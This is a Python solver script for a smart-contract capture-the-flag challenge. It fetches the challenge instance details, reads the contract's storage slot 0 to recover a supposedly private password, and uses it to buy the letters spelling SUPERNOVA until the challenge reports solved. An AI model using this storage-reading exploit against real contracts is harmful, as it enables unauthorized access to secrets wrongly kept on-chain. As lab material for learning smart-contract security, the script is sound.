from web3 import Web3
import time
import requests

info_response = requests.get('http://RPC_URL/info')
info_data = info_response.json()

user_id = info_data['user_id']

contract_info_response = requests.get(f'http://RPC_URL/info/{user_id}')
contract_info_data = contract_info_response.json()

contract_add = contract_info_data['contractAddress']
private_key = contract_info_data['privateKey']
rpc_url = contract_info_data['rpcUrl']
account_address = contract_info_data['walletAddress']

print("Contract Address:", contract_add)
print("Private Key:", private_key)
print("RPC URL:", rpc_url)
print("Account Address:", account_address)

web3 = Web3(Web3.HTTPProvider(rpc_url))
print("Are we connected?", web3.is_connected())

contract_abi = [{"inputs":[{"internalType":"address","name":"_wallet","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"solver","type":"address"}],"name":"ChallengeSolved","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"buyer","type":"address"},{"indexed":False,"internalType":"string","name":"letter","type":"string"},{"indexed":False,"internalType":"uint8","name":"quantity","type":"uint8"}],"name":"LetterPurchased","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"string","name":"","type":"string"}],"name":"cart","outputs":[{"internalType":"uint8","name":"quantity","type":"uint8"},{"internalType":"bool","name":"exists","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isChallSolved","outputs":[{"internalType":"bool","name":"solved","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"letter","type":"string"},{"internalType":"bytes32","name":"password","type":"bytes32"}],"name":"purchaseLetter","outputs":[],"stateMutability":"payable","type":"function"}]

supernova = web3.eth.contract(address=contract_add, abi=contract_abi)

password = web3.eth.get_storage_at(contract_add, 0).hex()

gas_price = web3.to_wei('20', 'gwei')

letters_to_purchase = {
    "S": 4,
    "U": 4,
    "P": 1,
    "E": 1,
    "R": 1,
    "N": 1,
    "O": 1,
    "V": 1,
    "A": 1
}

def purchase_letter(letter, quantity):
    for i in range(0, quantity):
        nonce = web3.eth.get_transaction_count(account_address)
        transaction = supernova.functions.purchaseLetter(letter, password).build_transaction({
            'from': account_address,
            'nonce': nonce,
            'chainId': web3.eth.chain_id,
            'gas': 2000000,
            'gasPrice': gas_price
        })
        signed_txn = web3.eth.account.sign_transaction(transaction, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Purchased {letter}: Transaction receipt {tx_receipt}")

        time.sleep(1)

for letter, quantity in letters_to_purchase.items():
    purchase_letter(letter, quantity)

solved = supernova.functions.isChallSolved().call({'from': account_address})
print(f"Challenge Solved: {solved}")
